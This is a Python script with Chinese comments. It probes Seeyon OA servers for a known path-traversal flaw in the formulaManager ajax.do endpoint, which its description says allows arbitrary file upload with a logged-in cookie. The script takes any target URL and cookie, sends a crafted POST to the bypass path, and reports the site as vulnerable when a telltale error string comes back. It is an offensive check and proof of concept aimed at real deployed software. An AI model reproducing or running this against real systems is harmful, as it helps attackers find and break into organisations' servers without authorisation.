
import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip可以上传任意文件，但是需要提供参数cookie',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')
parser.add_argument('-c', '--cookie', type=str, help='输入登录后cookie')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"  # 移除末尾的斜杠
    else:
        url = args.url + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': args.cookie,
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '8819',
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1'
}

data = {
    'managerMethod' : 'validate'
}

response = requests.post(url, headers=headers, data=data)
if "can not find the method" in response.text:
    print("目标url："+ url + '\n' +"访问存放的恶意成功\n")
    print(response.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞，或者网站未开启rmi服务")
# print(response.text)


